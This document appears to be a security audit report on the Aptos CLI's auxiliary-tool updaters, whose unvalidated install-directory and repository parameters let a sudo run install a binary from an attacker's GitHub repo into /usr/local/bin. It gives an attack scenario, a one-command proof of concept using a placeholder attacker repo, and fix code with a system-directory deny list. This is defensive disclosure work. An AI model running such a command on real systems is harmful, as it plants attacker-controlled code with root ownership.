# Audit Report

## Title
Privilege Escalation via Unvalidated Install Directory in Update Tools

## Summary
The Aptos CLI update functionality for auxiliary binaries (movefmt, revela, move-mutation-test) accepts user-controlled parameters for installation directory and GitHub repository without validation. When executed with elevated privileges (sudo), an attacker can install arbitrary binaries from attacker-controlled repositories into system-wide directories, leading to privilege escalation and persistent system compromise.

## Finding Description

The vulnerability exists in three update tools that share the same vulnerable code path through `build_updater()`:

1. **FormatterUpdateTool** (`movefmt.rs`)
2. **RevelaUpdateTool** (`revela.rs`)
3. **MutationTestUpdaterTool** (`move_mutation_test.rs`)

Each tool accepts the following user-controlled parameters:
- `--install_dir`: Installation directory with no validation [1](#0-0) 
- `--repo_owner`: GitHub repository owner with no validation [2](#0-1) 
- `--repo_name`: GitHub repository name with no validation [3](#0-2) 

The `build_updater()` function directly uses these parameters without any validation or sanitization: [4](#0-3) 

The function creates the installation directory if it doesn't exist, with elevated privileges if the CLI is run with sudo: [5](#0-4) 

**Attack Scenario:**

1. Attacker prepares a malicious GitHub repository with a binary release
2. Victim runs: `sudo aptos update movefmt --repo_owner attacker --repo_name malicious-repo --install_dir /usr/local/bin`
3. The CLI downloads the malicious binary from the attacker's repository
4. The binary is installed with root permissions in `/usr/local/bin/movefmt`
5. Since `/usr/local/bin` is in the system PATH, the malicious binary can be executed by any user
6. The attacker achieves persistent code execution with potential privilege escalation

This vulnerability also affects the same parameters in RevelaUpdateTool [6](#0-5)  and MutationTestUpdaterTool [7](#0-6) .

Note that the main `AptosUpdateTool` does NOT have this vulnerability as it doesn't expose the `--install_dir` parameter to users [8](#0-7) .

## Impact Explanation

This vulnerability is classified as **HIGH SEVERITY** based on the following criteria:

1. **Arbitrary Code Execution**: Attacker can execute arbitrary code with system privileges if the CLI is run with sudo
2. **Persistence**: Malicious binaries installed in system directories persist across reboots
3. **Privilege Escalation**: Low-privileged attacker can gain root access if they can convince a user to run the command with sudo
4. **System-Wide Impact**: Affects all users on the system since binaries in `/usr/local/bin` are accessible to everyone
5. **PATH Shadowing**: Attacker can shadow legitimate system binaries if they control the installation directory

While this doesn't directly impact the blockchain consensus or validator nodes (unless the update command is run on a validator with sudo), it represents a significant security risk for CLI users, especially in multi-user environments or CI/CD systems.

## Likelihood Explanation

**Likelihood: MEDIUM-HIGH**

The vulnerability requires:
- User to run the CLI with elevated privileges (sudo/administrator)
- User to specify custom `--repo_owner`, `--repo_name`, or `--install_dir` parameters
- Social engineering or user error to trigger the malicious command

Common scenarios where this could be exploited:
1. **CI/CD Pipelines**: Automated scripts that run update commands with sudo
2. **Documentation Examples**: If malicious examples are spread via forums/blogs
3. **User Error**: Users attempting to install tools system-wide following malicious instructions
4. **Compromised Scripts**: Build scripts or installation guides that include malicious parameters

The attack complexity is LOW - it requires only a single command execution with controlled parameters.

## Recommendation

Implement the following security controls:

### 1. Validate Installation Directory
Add validation to prevent installation in system directories when not appropriate:

```rust
fn validate_install_dir(install_dir: &PathBuf) -> Result<()> {
    // Prevent installation in system directories
    let system_dirs = [
        "/usr/bin", "/usr/local/bin", "/bin", "/sbin",
        "/usr/sbin", "/opt", "/System", "C:\\Windows",
        "C:\\Program Files"
    ];
    
    let path_str = install_dir.to_string_lossy();
    for sys_dir in system_dirs {
        if path_str.starts_with(sys_dir) {
            bail!(
                "Installation in system directory '{}' is not allowed. \
                Please use a user-level directory or omit --install_dir to use the default.",
                sys_dir
            );
        }
    }
    
    // Check for directory traversal attempts
    if path_str.contains("..") {
        bail!("Directory traversal patterns are not allowed in installation directory");
    }
    
    Ok(())
}
```

### 2. Validate Repository Parameters
Add a whitelist of trusted repository owners:

```rust
fn validate_repo_source(repo_owner: &str, repo_name: &str, tool_name: &str) -> Result<()> {
    let trusted_sources = match tool_name {
        "movefmt" => ("movebit", "movefmt"),
        "revela" => ("verichains", "revela"),
        "move-mutation-test" => ("eigerco", "move-mutation-tools"),
        _ => return Err(anyhow!("Unknown tool: {}", tool_name)),
    };
    
    if repo_owner != trusted_sources.0 || repo_name != trusted_sources.1 {
        eprintln!("WARNING: Downloading from non-default repository {}/{}", repo_owner, repo_name);
        eprintln!("Default repository is {}/{}", trusted_sources.0, trusted_sources.1);
        eprintln!("Only proceed if you trust this source.");
        // Require explicit confirmation
        if !Confirm::new()
            .with_prompt("Do you want to continue?")
            .default(false)
            .interact()? 
        {
            bail!("Update cancelled by user");
        }
    }
    
    Ok(())
}
```

### 3. Update build_updater() in update_helper.rs
Add validation before creating directories: [4](#0-3) 

```rust
pub fn build_updater(
    info: &UpdateRequiredInfo,
    install_dir: Option<PathBuf>,
    repo_owner: String,
    repo_name: String,
    binary_name: &str,
    // ... other params
) -> Result<Box<dyn ReleaseUpdate>> {
    // Validate repository source
    validate_repo_source(&repo_owner, &repo_name, binary_name)?;
    
    let install_dir = match install_dir.clone() {
        Some(dir) => {
            // Validate user-specified directory
            validate_install_dir(&dir)?;
            dir
        },
        None => {
            let dir = get_additional_binaries_dir();
            std::fs::create_dir_all(&dir)
                .with_context(|| format!("Failed to create directory: {:?}", dir))?;
            dir
        },
    };
    
    // Rest of the function...
}
```

### 4. Remove --install_dir Parameter (Strongest Fix)
For maximum security, remove the `--install_dir` parameter entirely from auxiliary tools, following the pattern of `AptosUpdateTool`, which only uses the default user-level directory.

## Proof of Concept

**Prerequisites:**
- Linux/macOS system with Aptos CLI installed
- Root/sudo access
- Attacker-controlled GitHub repository with a malicious binary release

**Step 1: Create Malicious Repository**
Create a GitHub repository `attacker/malicious-movefmt` with a release containing a binary that:
- Matches the expected naming format for the architecture
- Contains malicious payload (e.g., reverse shell, keylogger)

**Step 2: Execute Attack**
```bash
# As a regular user who has sudo access
sudo aptos update movefmt \
  --repo_owner attacker \
  --repo_name malicious-movefmt \
  --install_dir /usr/local/bin \
  --target_version 1.0.0 \
  --assume-yes
```

**Step 3: Verify Exploitation**
```bash
# The malicious binary is now installed with root ownership
ls -la /usr/local/bin/movefmt
# Output: -rwxr-xr-x 1 root root ... /usr/local/bin/movefmt

# When any user runs movefmt, the malicious code executes
movefmt --version  # Executes attacker's code
```

**Impact:** The attacker now has a persistent malicious binary installed in a system-wide location with root ownership, executable by any user on the system.

## Notes

- This vulnerability does NOT affect the main Aptos CLI update (`aptos update aptos`) as it doesn't expose the `--install_dir` parameter
- The vulnerability is present in three auxiliary tool updaters: movefmt, revela, and move-mutation-test
- The default installation directory is user-level (`~/.local/bin` or `%USERPROFILE%\.aptoscli\bin`), which is safe [9](#0-8) 
- The vulnerability only manifests when users explicitly provide custom parameters AND run with elevated privileges
- This is a client-side security issue and does not directly affect blockchain consensus or validator security, but it represents a significant risk for CLI users in production environments

### Citations

**File:** crates/aptos/src/update/movefmt.rs (L28-29)
```rust
    #[clap(long, default_value = "movebit")]
    repo_owner: String,
```

**File:** crates/aptos/src/update/movefmt.rs (L31-33)
```rust
    /// The name of the repo to download the binary from.
    #[clap(long, default_value = "movefmt")]
    repo_name: String,
```

**File:** crates/aptos/src/update/movefmt.rs (L44-45)
```rust
    #[clap(long)]
    install_dir: Option<PathBuf>,
```

**File:** crates/aptos/src/update/update_helper.rs (L28-78)
```rust
pub fn build_updater(
    info: &UpdateRequiredInfo,
    install_dir: Option<PathBuf>,
    repo_owner: String,
    repo_name: String,
    binary_name: &str,
    linux_name: &str,
    mac_os_name: &str,
    windows_name: &str,
    assume_yes: bool,
) -> Result<Box<dyn ReleaseUpdate>> {
    // Determine the target we should download based on how the CLI itself was built.
    let arch_str = get_arch();
    let build_info = cli_build_information();
    let target = match build_info.get(BUILD_OS).context("Failed to determine build info of current CLI")?.as_str() {
        "linux-aarch64" | "linux-x86_64" => linux_name,
        "macos-aarch64" | "macos-x86_64" => mac_os_name,
        "windows-x86_64" => windows_name,
        wildcard => bail!("Self-updating is not supported on your OS ({}) right now, please download the binary manually", wildcard),
    };

    let target = format!("{}-{}", arch_str, target);

    let install_dir = match install_dir.clone() {
        Some(dir) => dir,
        None => {
            let dir = get_additional_binaries_dir();
            // Make the directory if it doesn't already exist.
            std::fs::create_dir_all(&dir)
                .with_context(|| format!("Failed to create directory: {:?}", dir))?;
            dir
        },
    };

    let current_version = match &info.current_version {
        Some(version) => version,
        None => "0.0.0",
    };

    Update::configure()
        .bin_install_dir(install_dir)
        .bin_name(binary_name)
        .repo_owner(&repo_owner)
        .repo_name(&repo_name)
        .current_version(current_version)
        .target_version_tag(&format!("v{}", info.target_version))
        .target(&target)
        .no_confirm(assume_yes)
        .build()
        .map_err(|e| anyhow!("Failed to build self-update configuration: {:#}", e))
}
```

**File:** crates/aptos/src/update/revela.rs (L44-45)
```rust
    #[clap(long)]
    install_dir: Option<PathBuf>,
```

**File:** crates/aptos/src/update/move_mutation_test.rs (L44-45)
```rust
    #[clap(long)]
    install_dir: Option<PathBuf>,
```

**File:** crates/aptos/src/update/aptos.rs (L31-47)
```rust
#[derive(Debug, Parser)]
pub struct AptosUpdateTool {
    /// The owner of the repo to download the binary from.
    #[clap(long, default_value = "aptos-labs")]
    repo_owner: String,

    /// The name of the repo to download the binary from.
    #[clap(long, default_value = "aptos-core")]
    repo_name: String,

    /// If set, it will check if there are updates for the tool, but not actually update
    #[clap(long, default_value_t = false)]
    check: bool,

    #[clap(flatten)]
    pub prompt_options: PromptOptions,
}
```

**File:** crates/aptos/src/update/helpers.rs (L9-21)
```rust
pub fn get_additional_binaries_dir() -> PathBuf {
    #[cfg(windows)]
    {
        let home_dir = std::env::var("USERPROFILE").unwrap_or_else(|_| "".into());
        PathBuf::from(home_dir).join(".aptoscli/bin")
    }

    #[cfg(not(windows))]
    {
        let home_dir = std::env::var("HOME").unwrap_or_else(|_| "".into());
        PathBuf::from(home_dir).join(".local/bin")
    }
}
```
